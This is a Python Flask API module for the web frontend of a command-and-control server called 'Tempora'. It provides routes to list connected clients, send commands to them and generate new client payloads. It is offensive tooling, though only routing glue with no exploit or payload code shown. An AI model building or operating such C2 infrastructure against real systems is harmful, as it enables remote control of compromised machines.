#!/usr/bin/env python3
"""
Tempora C2 Web Frontend API
This module provides the API endpoints for communicating with the C2 server.
"""

import os
import sys
import logging
from flask import Blueprint, request, jsonify, current_app
from c2_api_client import C2APIClient

# Setup logging
logger = logging.getLogger("tempora-api")

# C2 Server API connection settings
C2_API_HOST = os.environ.get('C2_API_HOST', '127.0.0.1')
C2_API_PORT = int(os.environ.get('C2_API_PORT', 5000))

# Create Blueprint for API routes
api_bp = Blueprint('api', __name__, url_prefix='/api')

# Create a single C2APIClient instance for all API requests
c2_client = C2APIClient(server_host=C2_API_HOST, server_port=C2_API_PORT)

# API Routes
@api_bp.route('/status')
def status():
    """Get C2 server status"""
    response = c2_client.send_request('status')
    if response is None:
        return jsonify({'error': 'Could not connect to C2 server'}), 500
    return jsonify(response)

@api_bp.route('/clients')
def get_clients():
    """Get all connected clients"""
    response = c2_client.send_request('clients')
    if response is None:
        return jsonify({'error': 'Could not retrieve clients'}), 500
    return jsonify(response)

@api_bp.route('/clients/<client_id>')
def get_client(client_id):
    """Get details for a specific client"""
    response = c2_client.send_request('client_info', {'client_id': client_id})
    if response is None:
        return jsonify({'error': f'Could not retrieve client {client_id}'}), 500
    return jsonify(response)

@api_bp.route('/task', methods=['POST'])
def create_task():
    """Create a new task for a client"""
    data = request.json
    if not data or 'client_id' not in data or 'command' not in data:
        return jsonify({'error': 'Missing required fields: client_id and command'}), 400
    
    response = c2_client.send_request('create_task', data)
    if response is None:
        return jsonify({'error': 'Failed to create task'}), 500
    
    return jsonify({'success': True, 'task': response})

@api_bp.route('/tasks')
def get_tasks():
    """Get all tasks"""
    response = c2_client.send_request('tasks')
    if response is None:
        return jsonify({'error': 'Could not retrieve tasks'}), 500
    return jsonify(response)

@api_bp.route('/generate_payload', methods=['POST'])
def generate_payload():
    """Generate a new client payload"""
    options = request.json
    if not options:
        return jsonify({'error': 'Missing payload generation options'}), 400
    
    response = c2_client.send_request('generate_payload', options)
    if response is None:
        return jsonify({'error': 'Failed to generate payload'}), 500
    
    return jsonify(response) 